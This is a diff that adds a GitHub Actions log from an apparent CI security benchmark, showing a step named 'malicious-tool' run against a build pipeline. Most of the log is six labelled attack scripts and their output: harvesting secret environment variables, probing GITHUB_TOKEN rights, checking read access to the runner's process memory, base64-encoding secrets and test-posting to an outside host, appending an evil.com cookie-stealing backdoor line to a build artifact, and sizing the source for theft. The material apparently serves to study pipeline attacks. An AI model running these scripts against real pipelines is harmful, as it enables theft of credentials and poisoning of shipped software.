@@ -1,0 +1,374 @@
+﻿2026-04-02T19:08:38.8418935Z Current runner version: '2.333.1'
+2026-04-02T19:08:38.8443881Z ##[group]Runner Image Provisioner
+2026-04-02T19:08:38.8444875Z Hosted Compute Agent
+2026-04-02T19:08:38.8445461Z Version: 20260213.493
+2026-04-02T19:08:38.8446019Z Commit: 5c115507f6dd24b8de37d8bbe0bb4509d0cc0fa3
+2026-04-02T19:08:38.8446840Z Build Date: 2026-02-13T00:28:41Z
+2026-04-02T19:08:38.8447498Z Worker ID: {763ac4a2-d937-4355-8d21-8365535a9b5b}
+2026-04-02T19:08:38.8448646Z Azure Region: westus
+2026-04-02T19:08:38.8449258Z ##[endgroup]
+2026-04-02T19:08:38.8450717Z ##[group]Operating System
+2026-04-02T19:08:38.8451361Z Ubuntu
+2026-04-02T19:08:38.8451926Z 24.04.4
+2026-04-02T19:08:38.8452420Z LTS
+2026-04-02T19:08:38.8452956Z ##[endgroup]
+2026-04-02T19:08:38.8453492Z ##[group]Runner Image
+2026-04-02T19:08:38.8454057Z Image: ubuntu-24.04
+2026-04-02T19:08:38.8454710Z Version: 20260329.72.1
+2026-04-02T19:08:38.8455899Z Included Software: https://github.com/actions/runner-images/blob/ubuntu24/20260329.72/images/ubuntu/Ubuntu2404-Readme.md
+2026-04-02T19:08:38.8457478Z Image Release: https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20260329.72
+2026-04-02T19:08:38.8458701Z ##[endgroup]
+2026-04-02T19:08:38.8459837Z ##[group]GITHUB_TOKEN Permissions
+2026-04-02T19:08:38.8461664Z Contents: read
+2026-04-02T19:08:38.8462322Z Metadata: read
+2026-04-02T19:08:38.8462885Z ##[endgroup]
+2026-04-02T19:08:38.8464999Z Secret source: Actions
+2026-04-02T19:08:38.8465795Z Prepare workflow directory
+2026-04-02T19:08:38.9032078Z Prepare all required actions
+2026-04-02T19:08:38.9068227Z Getting action download info
+2026-04-02T19:08:39.3950760Z Download action repository 'actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11' (SHA:b4ffde65f46336ab88eb53be808477a3936bae11)
+2026-04-02T19:08:39.6258106Z Download action repository 'actions/upload-artifact@v4' (SHA:ea165f8d65b6e75b540449e92b4886f43607fa02)
+2026-04-02T19:08:39.8179834Z Complete job name: build-and-deploy
+2026-04-02T19:08:39.8811410Z ##[group]Run actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+2026-04-02T19:08:39.8812457Z with:
+2026-04-02T19:08:39.8812905Z   repository: AlphaSudo/sbtr-benchmark
+2026-04-02T19:08:39.8813616Z   token: ***
+2026-04-02T19:08:39.8814030Z   ssh-strict: true
+2026-04-02T19:08:39.8814484Z   persist-credentials: true
+2026-04-02T19:08:39.8814958Z   clean: true
+2026-04-02T19:08:39.8815396Z   sparse-checkout-cone-mode: true
+2026-04-02T19:08:39.8815900Z   fetch-depth: 1
+2026-04-02T19:08:39.8816313Z   fetch-tags: false
+2026-04-02T19:08:39.8816743Z   show-progress: true
+2026-04-02T19:08:39.8817182Z   lfs: false
+2026-04-02T19:08:39.8817578Z   submodules: false
+2026-04-02T19:08:39.8818289Z   set-safe-directory: true
+2026-04-02T19:08:39.8819018Z env:
+2026-04-02T19:08:39.8819493Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:39.8820126Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:39.8820742Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:39.8821361Z   DATABASE_URL: ***
+2026-04-02T19:08:39.8821816Z ##[endgroup]
+2026-04-02T19:08:39.9663411Z Syncing repository: AlphaSudo/sbtr-benchmark
+2026-04-02T19:08:39.9665147Z ##[group]Getting Git version info
+2026-04-02T19:08:39.9665946Z Working directory is '/home/runner/work/sbtr-benchmark/sbtr-benchmark'
+2026-04-02T19:08:39.9666974Z [command]/usr/bin/git version
+2026-04-02T19:08:39.9750610Z git version 2.53.0
+2026-04-02T19:08:39.9776540Z ##[endgroup]
+2026-04-02T19:08:39.9791886Z Temporarily overriding HOME='/home/runner/work/_temp/3b79308d-cb61-4560-8b19-8907d70a03a2' before making global git config changes
+2026-04-02T19:08:39.9794465Z Adding repository directory to the temporary git global config as a safe directory
+2026-04-02T19:08:39.9796698Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/sbtr-benchmark/sbtr-benchmark
+2026-04-02T19:08:39.9827085Z Deleting the contents of '/home/runner/work/sbtr-benchmark/sbtr-benchmark'
+2026-04-02T19:08:39.9831046Z ##[group]Initializing the repository
+2026-04-02T19:08:39.9834913Z [command]/usr/bin/git init /home/runner/work/sbtr-benchmark/sbtr-benchmark
+2026-04-02T19:08:39.9954394Z hint: Using 'master' as the name for the initial branch. This default branch name
+2026-04-02T19:08:39.9956593Z hint: will change to "main" in Git 3.0. To configure the initial branch name
+2026-04-02T19:08:39.9958574Z hint: to use in all of your new repositories, which will suppress this warning,
+2026-04-02T19:08:39.9959993Z hint: call:
+2026-04-02T19:08:39.9960759Z hint:
+2026-04-02T19:08:39.9961723Z hint: 	git config --global init.defaultBranch <name>
+2026-04-02T19:08:39.9962885Z hint:
+2026-04-02T19:08:39.9963933Z hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
+2026-04-02T19:08:39.9965580Z hint: 'development'. The just-created branch can be renamed via this command:
+2026-04-02T19:08:39.9966986Z hint:
+2026-04-02T19:08:39.9967754Z hint: 	git branch -m <name>
+2026-04-02T19:08:39.9968895Z hint:
+2026-04-02T19:08:39.9970011Z hint: Disable this message with "git config set advice.defaultBranchName false"
+2026-04-02T19:08:39.9972043Z Initialized empty Git repository in /home/runner/work/sbtr-benchmark/sbtr-benchmark/.git/
+2026-04-02T19:08:39.9974307Z [command]/usr/bin/git remote add origin https://github.com/AlphaSudo/sbtr-benchmark
+2026-04-02T19:08:39.9996855Z ##[endgroup]
+2026-04-02T19:08:39.9998528Z ##[group]Disabling automatic garbage collection
+2026-04-02T19:08:40.0000260Z [command]/usr/bin/git config --local gc.auto 0
+2026-04-02T19:08:40.0026656Z ##[endgroup]
+2026-04-02T19:08:40.0028294Z ##[group]Setting up auth
+2026-04-02T19:08:40.0033032Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-04-02T19:08:40.0059252Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-04-02T19:08:40.0341553Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-04-02T19:08:40.0366873Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-04-02T19:08:40.0574464Z [command]/usr/bin/git config --local http.https://github.com/.extraheader AUTHORIZATION: basic ***
+2026-04-02T19:08:40.0605657Z ##[endgroup]
+2026-04-02T19:08:40.0606447Z ##[group]Fetching the repository
+2026-04-02T19:08:40.0614132Z [command]/usr/bin/git -c protocol.version=2 fetch --no-tags --prune --no-recurse-submodules --depth=1 origin +c0fe69ccb7bcad29fbc3840faa279108cf19d4c1:refs/remotes/origin/main
+2026-04-02T19:08:40.4536647Z From https://github.com/AlphaSudo/sbtr-benchmark
+2026-04-02T19:08:40.4542666Z  * [new ref]         c0fe69ccb7bcad29fbc3840faa279108cf19d4c1 -> origin/main
+2026-04-02T19:08:40.4566503Z ##[endgroup]
+2026-04-02T19:08:40.4568218Z ##[group]Determining the checkout info
+2026-04-02T19:08:40.4569848Z ##[endgroup]
+2026-04-02T19:08:40.4571102Z ##[group]Checking out the ref
+2026-04-02T19:08:40.4574606Z [command]/usr/bin/git checkout --progress --force -B main refs/remotes/origin/main
+2026-04-02T19:08:40.4630848Z Switched to a new branch 'main'
+2026-04-02T19:08:40.4634131Z branch 'main' set up to track 'origin/main'.
+2026-04-02T19:08:40.4640994Z ##[endgroup]
+2026-04-02T19:08:40.4674703Z [command]/usr/bin/git log -1 --format='%H'
+2026-04-02T19:08:40.4696774Z 'c0fe69ccb7bcad29fbc3840faa279108cf19d4c1'
+2026-04-02T19:08:40.4886622Z ##[group]Run mkdir -p build
+2026-04-02T19:08:40.4887424Z [36;1mmkdir -p build[0m
+2026-04-02T19:08:40.4888403Z [36;1mcp src/app.js build/app.js[0m
+2026-04-02T19:08:40.4919367Z shell: /usr/bin/bash -e {0}
+2026-04-02T19:08:40.4920096Z env:
+2026-04-02T19:08:40.4920742Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:40.4921725Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:40.4922729Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:40.4923697Z   DATABASE_URL: ***
+2026-04-02T19:08:40.4924216Z ##[endgroup]
+2026-04-02T19:08:40.5364967Z Prepare all required actions
+2026-04-02T19:08:40.5612491Z ##[group]Run ./.github/actions/malicious-tool
+2026-04-02T19:08:40.5613453Z env:
+2026-04-02T19:08:40.5614013Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:40.5614885Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:40.5615773Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:40.5616661Z   DATABASE_URL: ***
+2026-04-02T19:08:40.5617162Z ##[endgroup]
+2026-04-02T19:08:40.5710404Z ##[group]Run FILES="$(find src -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | sort | tr '\n' ',')"
+2026-04-02T19:08:40.5712944Z [36;1mFILES="$(find src -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | sort | tr '\n' ',')"[0m
+2026-04-02T19:08:40.5714633Z [36;1mecho "files=$FILES" >> "$GITHUB_OUTPUT"[0m
+2026-04-02T19:08:40.5715488Z [36;1mecho "Found source files: $FILES"[0m
+2026-04-02T19:08:40.5743043Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:40.5743990Z env:
+2026-04-02T19:08:40.5744553Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:40.5745429Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:40.5746289Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:40.5747172Z   DATABASE_URL: ***
+2026-04-02T19:08:40.5747658Z ##[endgroup]
+2026-04-02T19:08:40.5822603Z Found source files: src/app.js,
+2026-04-02T19:08:40.5878821Z ##[group]Run echo "========================================="
+2026-04-02T19:08:40.5879807Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:40.5880742Z [36;1mecho "ATTACK 1: Environment Variable Dump"[0m
+2026-04-02T19:08:40.5881646Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:40.5882517Z [36;1mprintenv | sort > env_dump.txt[0m
+2026-04-02T19:08:40.5883307Z [36;1mwhile IFS= read -r line; do[0m
+2026-04-02T19:08:40.5884043Z [36;1m  KEY="${line%%=*}"[0m
+2026-04-02T19:08:40.5884640Z [36;1m  case "$KEY" in[0m
+2026-04-02T19:08:40.5885449Z [36;1m    *SECRET*|*TOKEN*|*KEY*|*PASSWORD*|*CREDENTIAL*|*AWS*)[0m
+2026-04-02T19:08:40.5886416Z [36;1m      echo "FOUND SECRET: $line"[0m
+2026-04-02T19:08:40.5887114Z [36;1m      ;;[0m
+2026-04-02T19:08:40.5887603Z [36;1m    GITHUB_TOKEN)[0m
+2026-04-02T19:08:40.5888547Z [36;1m      echo "FOUND GITHUB_TOKEN: ${line:0:30}..."[0m
+2026-04-02T19:08:40.5889359Z [36;1m      ;;[0m
+2026-04-02T19:08:40.5889824Z [36;1m  esac[0m
+2026-04-02T19:08:40.5890312Z [36;1mdone < env_dump.txt[0m
+2026-04-02T19:08:40.5891603Z [36;1mSECRET_COUNT="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|AWS' | wc -l || true)"[0m
+2026-04-02T19:08:40.5893223Z [36;1mecho "Total secrets found in environment: $SECRET_COUNT"[0m
+2026-04-02T19:08:40.5919000Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:40.5919967Z env:
+2026-04-02T19:08:40.5920584Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:40.5921448Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:40.5922304Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:40.5923230Z   DATABASE_URL: ***
+2026-04-02T19:08:40.5923735Z ##[endgroup]
+2026-04-02T19:08:40.6036362Z =========================================
+2026-04-02T19:08:40.6037581Z ATTACK 1: Environment Variable Dump
+2026-04-02T19:08:40.6038977Z =========================================
+2026-04-02T19:08:40.6869402Z FOUND SECRET: AWS_ACCESS_KEY_ID=***
+2026-04-02T19:08:40.6871245Z FOUND SECRET: AWS_SECRET_ACCESS_KEY=***
+2026-04-02T19:08:40.6872408Z FOUND SECRET: DEPLOY_TOKEN=***
+2026-04-02T19:08:40.6996151Z Total secrets found in environment: 3
+2026-04-02T19:08:40.7040652Z ##[group]Run echo "========================================="
+2026-04-02T19:08:40.7041643Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:40.7042601Z [36;1mecho "ATTACK 2: GITHUB_TOKEN Permission Check"[0m
+2026-04-02T19:08:40.7043540Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:40.7044369Z [36;1mif [ -n "$GITHUB_TOKEN" ]; then[0m
+2026-04-02T19:08:40.7046957Z [36;1m  REPO_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY" -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:08:40.7051528Z [36;1m  BRANCH_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/branches" -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:08:40.7056356Z [36;1m  RELEASE_STATUS="$(curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/releases" -d '{"tag_name":"test-probe","draft":true}' -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:08:40.7059940Z [36;1m  echo "Token exists: YES"[0m
+2026-04-02T19:08:40.7060722Z [36;1m  echo "Repo access status: $REPO_STATUS"[0m
+2026-04-02T19:08:40.7061673Z [36;1m  echo "Can read branches: $BRANCH_STATUS"[0m
+2026-04-02T19:08:40.7062613Z [36;1m  echo "Can create releases: $RELEASE_STATUS"[0m
+2026-04-02T19:08:40.7063405Z [36;1melse[0m
+2026-04-02T19:08:40.7064047Z [36;1m  echo "No GITHUB_TOKEN found in environment"[0m
+2026-04-02T19:08:40.7064853Z [36;1mfi[0m
+2026-04-02T19:08:40.7090446Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:40.7091339Z env:
+2026-04-02T19:08:40.7091886Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:40.7092743Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:40.7093619Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:40.7094474Z   DATABASE_URL: ***
+2026-04-02T19:08:40.7095215Z   GITHUB_TOKEN: ***
+2026-04-02T19:08:40.7095700Z ##[endgroup]
+2026-04-02T19:08:40.7143741Z =========================================
+2026-04-02T19:08:40.7144981Z ATTACK 2: GITHUB_TOKEN Permission Check
+2026-04-02T19:08:40.7146133Z =========================================
+2026-04-02T19:08:41.6520660Z Token exists: YES
+2026-04-02T19:08:41.6521759Z Repo access status: 200
+2026-04-02T19:08:41.6523043Z Can read branches: 200
+2026-04-02T19:08:41.6524175Z Can create releases: 403
+2026-04-02T19:08:41.6572144Z ##[group]Run echo "========================================="
+2026-04-02T19:08:41.6573700Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:41.6575139Z [36;1mecho "ATTACK 3: Process Memory Scan"[0m
+2026-04-02T19:08:41.6576561Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:41.6578379Z [36;1mRUNNER_PID="$(pgrep -f 'Runner.Worker' || echo 'none')"[0m
+2026-04-02T19:08:41.6579925Z [36;1mecho "Runner.Worker PID: $RUNNER_PID"[0m
+2026-04-02T19:08:41.6581493Z [36;1mif [ "$RUNNER_PID" != "none" ] && [ -r "/proc/$RUNNER_PID/maps" ]; then[0m
+2026-04-02T19:08:41.6583139Z [36;1m  echo "Can read /proc/$RUNNER_PID/maps: YES"[0m
+2026-04-02T19:08:41.6584834Z [36;1m  READABLE_REGIONS="$(grep ' r' "/proc/$RUNNER_PID/maps" | wc -l || true)"[0m
+2026-04-02T19:08:41.6586630Z [36;1m  echo "Readable memory regions: $READABLE_REGIONS"[0m
+2026-04-02T19:08:41.6588273Z [36;1m  echo "Memory dump capability: CONFIRMED"[0m
+2026-04-02T19:08:41.6589590Z [36;1melse[0m
+2026-04-02T19:08:41.6590687Z [36;1m  echo "Memory dump capability: BLOCKED"[0m
+2026-04-02T19:08:41.6591918Z [36;1mfi[0m
+2026-04-02T19:08:41.6621580Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:41.6622880Z env:
+2026-04-02T19:08:41.6624067Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:41.6625410Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:41.6626691Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:41.6628309Z   DATABASE_URL: ***
+2026-04-02T19:08:41.6629210Z ##[endgroup]
+2026-04-02T19:08:41.6686567Z =========================================
+2026-04-02T19:08:41.6688290Z ATTACK 3: Process Memory Scan
+2026-04-02T19:08:41.6689910Z =========================================
+2026-04-02T19:08:41.6862802Z Runner.Worker PID: 2172
+2026-04-02T19:08:41.6864157Z Can read /proc/2172/maps: YES
+2026-04-02T19:08:41.6894091Z Readable memory regions: 822
+2026-04-02T19:08:41.6896151Z Memory dump capability: CONFIRMED
+2026-04-02T19:08:41.6942318Z ##[group]Run echo "========================================="
+2026-04-02T19:08:41.6943854Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:41.6945117Z [36;1mecho "ATTACK 4: Exfiltration Attempt"[0m
+2026-04-02T19:08:41.6946459Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:41.6948491Z [36;1mPAYLOAD="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|AWS' | base64 -w 0 || true)"[0m
+2026-04-02T19:08:41.6950124Z [36;1mif [ -n "$PAYLOAD" ]; then[0m
+2026-04-02T19:08:41.6951321Z [36;1m  echo "Encoded payload ready (${#PAYLOAD} bytes)"[0m
+2026-04-02T19:08:41.6952555Z [36;1m  echo "Base64 payload:"[0m
+2026-04-02T19:08:41.6953561Z [36;1m  echo "$PAYLOAD"[0m
+2026-04-02T19:08:41.6954467Z [36;1melse[0m
+2026-04-02T19:08:41.6955364Z [36;1m  echo "No secrets found to exfiltrate"[0m
+2026-04-02T19:08:41.6956454Z [36;1mfi[0m
+2026-04-02T19:08:41.6958549Z [36;1mEXFIL_TEST="$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 https://httpbin.org/post -d "data=test_exfil" 2>/dev/null || echo "blocked")"[0m
+2026-04-02T19:08:41.6960873Z [36;1mecho "Outbound HTTP to external server: $EXFIL_TEST"[0m
+2026-04-02T19:08:41.6987264Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:41.6988715Z env:
+2026-04-02T19:08:41.6989590Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:41.6990822Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:41.6992084Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:41.6993342Z   DATABASE_URL: ***
+2026-04-02T19:08:41.6994230Z ##[endgroup]
+2026-04-02T19:08:41.7048204Z =========================================
+2026-04-02T19:08:41.7049681Z ATTACK 4: Exfiltration Attempt
+2026-04-02T19:08:41.7051211Z =========================================
+2026-04-02T19:08:41.7134239Z Encoded payload ready (212 bytes)
+2026-04-02T19:08:41.7135857Z Base64 payload:
+2026-04-02T19:08:41.7141235Z QVdTX1NFQ1JFVF9BQ0NFU1NfS0VZPXdKYWxyWFV0bkZFTUkvSzdNREVORy9iUHhSZmlDWUVYQU1QTEVLRVkKREVQTE9ZX1RPS0VOPWdocF9mYWtlMGRlcGxveTB0b2tlbjBmb3IwYmVuY2htYXJrMG9ubHkwMApBV1NfQUNDRVNTX0tFWV9JRD1BS0lBSU9TRk9ETk43RVhBTVBMRQo=
+2026-04-02T19:08:42.1755604Z Outbound HTTP to external server: 200
+2026-04-02T19:08:42.1803668Z ##[group]Run echo "========================================="
+2026-04-02T19:08:42.1804941Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.1806129Z [36;1mecho "ATTACK 5: Artifact Poisoning"[0m
+2026-04-02T19:08:42.1807283Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.1808740Z [36;1mmkdir -p build[0m
+2026-04-02T19:08:42.1809678Z [36;1mif [ ! -f "build/app.js" ]; then[0m
+2026-04-02T19:08:42.1810897Z [36;1m  echo "console.log('legitimate app');" > build/app.js[0m
+2026-04-02T19:08:42.1812075Z [36;1mfi[0m
+2026-04-02T19:08:42.1812813Z [36;1m{[0m
+2026-04-02T19:08:42.1813539Z [36;1m  echo ""[0m
+2026-04-02T19:08:42.1814736Z [36;1m  echo "// BACKDOOR: fetch('https://evil.com/steal?' + document.cookie)"[0m
+2026-04-02T19:08:42.1816094Z [36;1m} >> build/app.js[0m
+2026-04-02T19:08:42.1817077Z [36;1mecho "Artifact poisoned successfully"[0m
+2026-04-02T19:08:42.1845910Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:42.1847044Z env:
+2026-04-02T19:08:42.1848111Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:42.1849302Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:42.1850441Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:42.1851567Z   DATABASE_URL: ***
+2026-04-02T19:08:42.1852342Z ##[endgroup]
+2026-04-02T19:08:42.1906780Z =========================================
+2026-04-02T19:08:42.1908166Z ATTACK 5: Artifact Poisoning
+2026-04-02T19:08:42.1909072Z =========================================
+2026-04-02T19:08:42.1920264Z Artifact poisoned successfully
+2026-04-02T19:08:42.1963930Z ##[group]Run echo "========================================="
+2026-04-02T19:08:42.1965172Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.1966380Z [36;1mecho "ATTACK 6: Source Code Theft Attempt"[0m
+2026-04-02T19:08:42.1967572Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.1969829Z [36;1mFILE_COUNT="$(find . -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | wc -l || true)"[0m
+2026-04-02T19:08:42.1971868Z [36;1mTOTAL_SIZE="$(du -sh . 2>/dev/null | cut -f1 || echo 'unknown')"[0m
+2026-04-02T19:08:42.1973337Z [36;1mecho "Source files found: $FILE_COUNT"[0m
+2026-04-02T19:08:42.1974489Z [36;1mecho "Total workspace size: $TOTAL_SIZE"[0m
+2026-04-02T19:08:42.1975691Z [36;1mecho "Could compress and exfiltrate: YES"[0m
+2026-04-02T19:08:42.2003492Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:42.2004648Z env:
+2026-04-02T19:08:42.2005501Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:42.2006657Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:42.2007809Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:42.2009262Z   DATABASE_URL: ***
+2026-04-02T19:08:42.2010066Z ##[endgroup]
+2026-04-02T19:08:42.2063877Z =========================================
+2026-04-02T19:08:42.2065208Z ATTACK 6: Source Code Theft Attempt
+2026-04-02T19:08:42.2066789Z =========================================
+2026-04-02T19:08:42.2198900Z Source files found: 2
+2026-04-02T19:08:42.2200667Z Total workspace size: 620K
+2026-04-02T19:08:42.2202248Z Could compress and exfiltrate: YES
+2026-04-02T19:08:42.2244537Z ##[group]Run echo "========================================="
+2026-04-02T19:08:42.2245827Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.2246923Z [36;1mecho "ATTACK SUMMARY"[0m
+2026-04-02T19:08:42.2248161Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.2249338Z [36;1mecho "1. Environment variable dump"[0m
+2026-04-02T19:08:42.2250501Z [36;1mecho "2. GITHUB_TOKEN permission probe"[0m
+2026-04-02T19:08:42.2251667Z [36;1mecho "3. Process memory access check"[0m
+2026-04-02T19:08:42.2252904Z [36;1mecho "4. Exfiltration via encoded logs + HTTP"[0m
+2026-04-02T19:08:42.2254111Z [36;1mecho "5. Build artifact poisoning"[0m
+2026-04-02T19:08:42.2255195Z [36;1mecho "6. Source code enumeration"[0m
+2026-04-02T19:08:42.2283124Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:42.2284273Z env:
+2026-04-02T19:08:42.2285133Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:42.2286302Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:42.2287477Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:42.2288875Z   DATABASE_URL: ***
+2026-04-02T19:08:42.2289691Z ##[endgroup]
+2026-04-02T19:08:42.2343339Z =========================================
+2026-04-02T19:08:42.2344506Z ATTACK SUMMARY
+2026-04-02T19:08:42.2346073Z =========================================
+2026-04-02T19:08:42.2347531Z 1. Environment variable dump
+2026-04-02T19:08:42.2348879Z 2. GITHUB_TOKEN permission probe
+2026-04-02T19:08:42.2349888Z 3. Process memory access check
+2026-04-02T19:08:42.2350899Z 4. Exfiltration via encoded logs + HTTP
+2026-04-02T19:08:42.2351941Z 5. Build artifact poisoning
+2026-04-02T19:08:42.2352872Z 6. Source code enumeration
+2026-04-02T19:08:42.2439038Z ##[group]Run echo "Deploying with credentials..."
+2026-04-02T19:08:42.2440325Z [36;1mecho "Deploying with credentials..."[0m
+2026-04-02T19:08:42.2441420Z [36;1mbash ./deploy.sh[0m
+2026-04-02T19:08:42.2468892Z shell: /usr/bin/bash -e {0}
+2026-04-02T19:08:42.2469811Z env:
+2026-04-02T19:08:42.2470756Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:42.2472040Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:42.2473319Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:42.2474544Z   DATABASE_URL: ***
+2026-04-02T19:08:42.2475359Z ##[endgroup]
+2026-04-02T19:08:42.2532567Z Deploying with credentials...
+2026-04-02T19:08:42.2545631Z deploy: would ship build/app.js to production
+2026-04-02T19:08:42.2659976Z ##[group]Run actions/upload-artifact@v4
+2026-04-02T19:08:42.2660944Z with:
+2026-04-02T19:08:42.2661640Z   name: tier2-app
+2026-04-02T19:08:42.2662404Z   path: build/app.js
+2026-04-02T19:08:42.2663217Z   if-no-files-found: warn
+2026-04-02T19:08:42.2664078Z   compression-level: 6
+2026-04-02T19:08:42.2664877Z   overwrite: false
+2026-04-02T19:08:42.2665678Z   include-hidden-files: false
+2026-04-02T19:08:42.2666528Z env:
+2026-04-02T19:08:42.2667332Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:42.2668692Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:42.2669892Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:42.2671056Z   DATABASE_URL: ***
+2026-04-02T19:08:42.2672068Z ##[endgroup]
+2026-04-02T19:08:42.4865812Z With the provided path, there will be 1 file uploaded
+2026-04-02T19:08:42.4870782Z Artifact name is valid!
+2026-04-02T19:08:42.4872103Z Root directory input is valid!
+2026-04-02T19:08:42.7544320Z Beginning upload of artifact content to blob storage
+2026-04-02T19:08:43.0900289Z Uploaded bytes 228
+2026-04-02T19:08:43.1791941Z Finished uploading artifact content to blob storage!
+2026-04-02T19:08:43.1796273Z SHA256 digest of uploaded artifact zip is 84364736bc7a12e6cc5b6fb3cb3ed32adc111bcc7e9eb342d3a9bbc2d50040e3
+2026-04-02T19:08:43.1798860Z Finalizing artifact upload
+2026-04-02T19:08:43.3713432Z Artifact tier2-app.zip successfully finalized. Artifact ID 6248684386
+2026-04-02T19:08:43.3714770Z Artifact tier2-app has been successfully uploaded! Final size is 228 bytes. Artifact ID is 6248684386
+2026-04-02T19:08:43.3722557Z Artifact download URL: https://github.com/AlphaSudo/sbtr-benchmark/actions/runs/23917361226/artifacts/6248684386
+2026-04-02T19:08:43.3880372Z Post job cleanup.
+2026-04-02T19:08:43.4606542Z [command]/usr/bin/git version
+2026-04-02T19:08:43.4640833Z git version 2.53.0
+2026-04-02T19:08:43.4684108Z Temporarily overriding HOME='/home/runner/work/_temp/d7905d90-6b73-48a4-87e7-ac5798b5b2a8' before making global git config changes
+2026-04-02T19:08:43.4685597Z Adding repository directory to the temporary git global config as a safe directory
+2026-04-02T19:08:43.4688982Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/sbtr-benchmark/sbtr-benchmark
+2026-04-02T19:08:43.4722392Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
